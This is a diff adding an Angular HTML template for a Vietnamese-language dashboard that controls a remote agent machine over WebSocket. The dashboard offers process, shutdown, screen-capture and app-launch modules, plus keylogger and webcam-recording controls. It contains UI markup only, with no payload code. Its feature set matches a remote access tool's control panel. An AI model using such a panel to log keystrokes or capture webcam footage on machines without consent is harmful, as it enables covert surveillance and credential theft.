@@ -1,0 +1,200 @@
+<style>
+  .page { max-width: 1100px; margin: 24px auto; padding: 0 16px; font-family: system-ui; }
+  h1 { font-size: 28px; margin-bottom: 6px; }
+  .subtitle { color: #6b7280; margin-bottom: 20px; }
+  .card {
+    background: #fff; padding: 20px; border-radius: 12px;
+    border: 1px solid #e5e7eb; box-shadow: 0 4px 16px rgba(0,0,0,0.04);
+  }
+  .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-bottom: 20px; }
+  .status-pill { padding: 4px 10px; border-radius: 999px; font-size: 13px; font-weight: 500; }
+  .pill-online { background: #ecfdf3; color: #166534; }
+  .pill-offline { background: #fef2f2; color: #b91c1c; }
+  .btn { padding: 8px 14px; border: none; border-radius: 8px; color: #fff; background:#2563eb; cursor:pointer; }
+  .btn-danger { background:#dc2626; }
+  .btn-secondary { background:#e5e7eb; color:#111827; }
+  pre { background:#0f172a; color:#e5e7eb; padding:14px; border-radius:8px; max-height:260px; overflow:auto; }
+  .modules-card { margin-top:20px; }
+  .module-grid { display:grid; grid-template-columns:repeat(3,1fr); gap:12px; }
+  .module-btn {
+    padding:16px; border-radius:12px; border:1px solid #e5e7eb;
+    background:#f9fafb; cursor:pointer; transition:.15s;
+  }
+  .module-btn:hover { border-color:#2563eb; background:#eff6ff; transform:translateY(-1px); }
+  table { width:100%; border-collapse:collapse; margin-top:12px; }
+  th { background:#f9fafb; padding:8px; text-align:left; border-bottom:1px solid #e5e7eb; }
+  td { padding:8px; border-bottom:1px solid #f3f4f6; }
+</style>
+
+<div class="page" *ngIf="agent; else loading">
+
+  <h1>Điều khiển Agent: {{ agent.machineId }}</h1>
+  <div class="subtitle">Dashboard điều khiển & gửi lệnh WebSocket</div>
+
+  <!-- =================== TOP INFO =================== -->
+  <div class="grid-2">
+    <section class="card">
+      <h2>Thông tin máy</h2>
+
+      <div><b>Machine ID:</b> {{ agent.machineId }}</div>
+      <div><b>IP:</b> {{ agent.ip }}</div>
+      <div><b>OS:</b> {{ agent.os }}</div>
+      <div><b>WS Port:</b> {{ agent.wsPort }}</div>
+
+      <div style="margin-top:10px;">
+        <b>Trạng thái:</b>
+        <span class="status-pill" [ngClass]="agent.online ? 'pill-online' : 'pill-offline'">
+          ● {{ agent.online ? 'Online' : 'Offline' }}
+        </span>
+      </div>
+
+      <button class="btn" style="margin-top:14px;" (click)="connectWS()" [disabled]="!agent.online">
+        🔌 Kết nối WebSocket
+      </button>
+
+      <h3 style="margin-top:16px;">Agent JSON</h3>
+      <pre>{{ agent | json }}</pre>
+    </section>
+
+    <section class="card">
+      <h2>WebSocket</h2>
+      <div><b>Status:</b> {{ ws.status() }}</div>
+
+      <h3 style="margin-top:10px;">Tin nhắn mới nhất</h3>
+      <pre *ngIf="lastResponse; else noMsg">{{ lastResponse | json }}</pre>
+      <ng-template #noMsg><pre>null</pre></ng-template>
+    </section>
+  </div>
+
+  <!-- =================== RAW JSON =================== -->
+  <section class="card">
+    <h2>Gửi JSON</h2>
+    <textarea class="json-area" [(ngModel)]="rawJson" style="width:100%; min-height:90px;"></textarea>
+    <button class="btn" style="margin-top:10px;" (click)="sendRawJson()">📤 Gửi JSON</button>
+  </section>
+
+  <!-- =================== MODULE MENU =================== -->
+  <section class="card modules-card">
+
+    <h2>Modules</h2>
+
+    <div *ngIf="!selectedModule">
+      <div class="module-grid">
+
+        <button class="module-btn" (click)="openModule('PROCESS')">PROCESS</button>
+        <button class="module-btn" (click)="openModule('SYSTEM')">SYSTEM</button>
+        <button class="module-btn" (click)="openModule('SCREEN')">SCREEN</button>
+        <button class="module-btn" (click)="openModule('APP')">APP</button>
+        <button class="module-btn" (click)="openModule('KEYLOGGER')">KEYLOGGER</button>
+        <button class="module-btn" (click)="openModule('WEBCAM')">WEBCAM</button>
+
+      </div>
+    </div>
+
+    <!-- ==== PROCESS ==== -->
+    <div *ngIf="selectedModule === 'PROCESS'">
+      <button class="btn btn-secondary" (click)="backToModules()">← Quay lại</button>
+
+      <div class="btn-bar" style="margin-top:12px;">
+        <button class="btn" (click)="sendProcessList()">LIST</button>
+        <button class="btn btn-danger" (click)="sendProcessKill()">KILL…</button>
+        <button class="btn" (click)="sendProcessStart()">START…</button>
+      </div>
+
+      <table *ngIf="processList.length">
+        <thead>
+          <tr>
+            <th>PID</th><th>Name</th><th>Threads</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr *ngFor="let p of processList">
+            <td>{{ p.pid }}</td>
+            <td>{{ p.name }}</td>
+            <td>{{ p.threads }}</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <!-- ==== SYSTEM ==== -->
+    <div *ngIf="selectedModule === 'SYSTEM'">
+      <button class="btn btn-secondary" (click)="backToModules()">← Quay lại</button>
+
+      <div class="btn-bar" style="margin-top:12px;">
+        <button class="btn btn-danger" (click)="sendSystemShutdown()">SHUTDOWN</button>
+        <button class="btn btn-danger" (click)="sendSystemRestart()">RESTART</button>
+        <button class="btn" (click)="sendSystemLogoff()">LOGOFF</button>
+        <button class="btn" (click)="sendSystemLock()">LOCK</button>
+      </div>
+    </div>
+
+    <!-- ==== SCREEN ==== -->
+    <div *ngIf="selectedModule === 'SCREEN'">
+      <button class="btn btn-secondary" (click)="backToModules()">← Quay lại</button>
+      <button class="btn" style="margin-top:12px;" (click)="sendScreenCapture()">CAPTURE</button>
+    </div>
+
+    <!-- ==== APP ==== -->
+    <div *ngIf="selectedModule === 'APP'">
+      <button class="btn btn-secondary" (click)="backToModules()">← Quay lại</button>
+
+      <div class="btn-bar" style="margin-top:12px;">
+        <button class="btn" (click)="sendAppList()">LIST_APPS</button>
+        <button class="btn" (click)="sendAppStart()">START_APP…</button>
+      </div>
+
+      <table *ngIf="appList.length">
+        <thead>
+          <tr><th>ID</th><th>Name</th><th>Path</th></tr>
+        </thead>
+        <tbody>
+          <tr *ngFor="let a of appList">
+            <td>{{ a.id }}</td>
+            <td>{{ a.name }}</td>
+            <td>{{ a.path }}</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <!-- ==== KEYLOGGER ==== -->
+    <div *ngIf="selectedModule === 'KEYLOGGER'">
+      <button class="btn btn-secondary" (click)="backToModules()">← Quay lại</button>
+
+      <div class="btn-bar" style="margin-top:12px;">
+        <button class="btn" (click)="sendKeyloggerStart()">START_LOG</button>
+        <button class="btn" (click)="sendKeyloggerStop()">STOP_LOG</button>
+        <button class="btn" (click)="sendKeyloggerGetLog()">GET_LOG</button>
+      </div>
+
+      <table *ngIf="keylogEntries.length">
+        <thead>
+          <tr><th>ID</th><th>Time</th><th>Text</th></tr>
+        </thead>
+        <tbody>
+          <tr *ngFor="let k of keylogEntries">
+            <td>{{ k.id }}</td>
+            <td>{{ k.timestamp }}</td>
+            <td>{{ k.text }}</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <!-- ==== WEBCAM ==== -->
+    <div *ngIf="selectedModule === 'WEBCAM'">
+      <button class="btn btn-secondary" (click)="backToModules()">← Quay lại</button>
+
+      <div class="btn-bar" style="margin-top:12px;">
+        <button class="btn" (click)="sendWebcamCapturePhoto()">CAPTURE_PHOTO</button>
+        <button class="btn" (click)="sendWebcamRecordVideo()">RECORD_VIDEO…</button>
+      </div>
+    </div>
+
+  </section>
+</div>
+
+<ng-template #loading>
+  <div class="page"><h2>Đang tải...</h2></div>
+</ng-template>
